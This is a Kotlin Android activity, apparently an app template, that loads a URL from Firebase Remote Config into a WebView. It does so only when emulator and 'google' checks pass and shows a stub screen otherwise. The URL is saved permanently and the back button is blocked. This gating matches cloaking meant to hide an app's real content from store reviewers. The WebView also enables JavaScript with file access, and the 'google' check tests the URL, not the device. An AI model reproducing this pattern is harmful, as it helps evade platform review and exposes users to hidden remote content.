package com.example.testtasck

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.res.Configuration
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.webkit.CookieManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings

private const val FILE_PICKER_REQUEST_CODE = 123

private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
private lateinit var sharedPrefs: SharedPreferences

class MainActivity : AppCompatActivity() {
    private lateinit var originalWebView: WebView
    private lateinit var webView: ScrollableWebView

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        // Обработка изменения ориентации здесь, если необходимо.
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Установка темы обратно на основную тему после отображения сплэш-экрана
        setTheme(R.style.SplashTheme)

        if (isNetworkAvailable()) {
            // Интернет доступен, выполните действия, которые требуют интернет-соединения
        } else {
            // Интернет недоступен, переходите к экрану без интернета
            startActivity(Intent(this, NoInternetActivity::class.java))
            finish() // Завершаем текущую активность
        }

        originalWebView = findViewById(R.id.webView)
        webView = findViewById(R.id.webView)

        // Настройки WebView
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(webView, true)

        val searchEditText = findViewById<EditText>(R.id.searchEditText)
        webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        val webSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.setSupportZoom(false)
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true

        webView.setOnKeyListener { _, keyCode, event ->
            if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
                // Если есть история переходов, вернуться на предыдущую страницу
                webView.goBack()
                true // Заблокировать обработку события кнопки "назад"
            } else {
                false // Разрешить обработку события кнопки "назад" по умолчанию
            }
        }

        searchEditText.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_SEARCH) {
                val searchText = searchEditText.text.toString()
                val url = "https://www.google.com/search?q=$searchText"
                webView.loadUrl(url)
                true
            } else {
                false
            }
        }

        // Настройка WebViewClient, чтобы открывать ссылки внутри WebView
        webView.webViewClient = WebViewClient()

        // Загрузка локальной HTML-страницы (local_page.html) из assets
        webView.loadUrl("file:///android_asset/local_page.html")

        // Инициализация Firebase Remote Config
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(1) // Устанавливает интервал обновления данных (в секундах)
            .build()
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)



        sharedPrefs = getSharedPreferences("MyAppPrefs", Context.MODE_PRIVATE)

        val savedUrl = sharedPrefs.getString("savedUrl", "")

        if (savedUrl != null && savedUrl.isNotEmpty()) {
            // Если сохраненная ссылка есть и не пустая, открываем ее в WebView
            // и больше не проверяем условия
            webView.loadUrl(savedUrl)
            Log.d("MainActivity", "Открываем сохраненную ссылку в WebView")
        } else {
            // Проверяем доступность сети
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val networkInfo = connectivityManager.activeNetworkInfo

            if (networkInfo != null && networkInfo.isConnected) {
                // Пытаемся получить ссылку из Firebase Remote Config
                try {
                    // Выполняем запрос на получение данных
                    mFirebaseRemoteConfig.fetchAndActivate()
                        .addOnCompleteListener(this) { task ->
                            if (task.isSuccessful) {
                                val url = mFirebaseRemoteConfig.getString("url")

                                // Проверяем условие
                                if (url.isNotEmpty() && !isGoogleDevice(url) && !isEmulator(url)) {
                                    // Сохраняем полученную ссылку в SharedPreferences
                                    with(sharedPrefs.edit()) {
                                        putString("savedUrl", url)
                                        apply()
                                    }

                                    // Открываем ссылку в WebView
                                    webView.loadUrl(url)
                                    Log.d("MainActivity", "Открываем ссылку в WebView")
                                } else {
                                    // Открываем заглушку (AnotherActivity)
                                    val intent = Intent(this@MainActivity, AnotherActivity::class.java)
                                    startActivity(intent)
                                    Log.d("MainActivity", "Нажата кнопка для перехода на AnotherActivity")
                                }
                            } else {
                                showToast("Failed to fetch data. Please check your network connection.")
                                // Если не удалось получить данные из Firebase Remote Config, показываем ошибку
                                showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
                                Log.e("MainActivity", "Ошибка при обработке Firebase Remote Config: ${task.exception?.message}")
                            }
                        }
                } catch (e: Exception) {
                    showToast("Failed to fetch data. Please check your network connection.")
                    showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
                    Log.e("MainActivity", "Ошибка при обработке Firebase Remote Config: ${e.message}")
                }
            } else {
                showToast("Failed to fetch data. Please check your network connection.")
                // Нет интернета и нет сохраненной ссылки, показываем ошибку
                showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
                Log.d("MainActivity", "Нет интернета и нет сохраненной ссылки, переход на AnotherActivity")
            }
        }




        val buttonMain = findViewById<Button>(R.id.button_main)

        Log.d("MainActivity", "Activity создана")

        buttonMain.setOnClickListener(
            object : View.OnClickListener {
                override fun onClick(view: View?) {
                    val intent = Intent(this@MainActivity, AnotherActivity::class.java)
                    startActivity(intent)
                    Log.d("MainActivity", "Нажата кнопка для перехода на AnotherActivity")
                }
            })

        val buttonClearSavedUrl = findViewById<Button>(R.id.button_clear_saved_url)

        buttonClearSavedUrl.setOnClickListener {
            clearSavedUrl()
        }
    }
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack() // Вернуться по истории браузера, если возможно
        } else {
            // Кнопка "Назад" заблокирована
            Toast.makeText(this, "Нельзя вернуться назад", Toast.LENGTH_SHORT).show()
        }
    }
    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
    // Функция для проверки, что это устройство Google
    private fun isGoogleDevice(url: String): Boolean {
        Log.d("MainActivity", "isGoogle:")
        return url.contains("google")
    }

    private fun isEmulator(url: String): Boolean {
        Log.d("MainActivity", "isEmulator:")
        return !url.isNotEmpty() || Build.FINGERPRINT.startsWith("generic")
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo: NetworkInfo? = connectivityManager.activeNetworkInfo
        return networkInfo?.isConnectedOrConnecting == true
    }

    fun clearSavedUrl() {
        // Получаем доступ к SharedPreferences
        val sharedPrefs = getSharedPreferences("MyAppPrefs", Context.MODE_PRIVATE)

        // Создаем объект SharedPreferences.Editor для редактирования
        val editor = sharedPrefs.edit()

        // Удаляем сохраненную ссылку по ее ключу ("savedUrl" в данном случае)
        editor.remove("savedUrl")

        // Применяем изменения
        editor.apply()

        // Очищаем текст в EditText
        val searchEditText = findViewById<EditText>(R.id.searchEditText)
        searchEditText.text.clear()

        // Оповещение пользователя о удалении сохраненной ссылки (по вашему желанию)
        Toast.makeText(this, "Сохраненная ссылка удалена", Toast.LENGTH_SHORT).show()
    }

    fun showErrorScreenWithMessage(errorMessage: String) {
        val errorIntent = Intent(this, NoInternetActivity::class.java)
        errorIntent.putExtra("message", errorMessage)
        startActivity(errorIntent)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == FILE_PICKER_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
            data?.data?.let { uri ->
                // код для работы с выбранным JSON файлом (uri)
            }
        }
    }
}
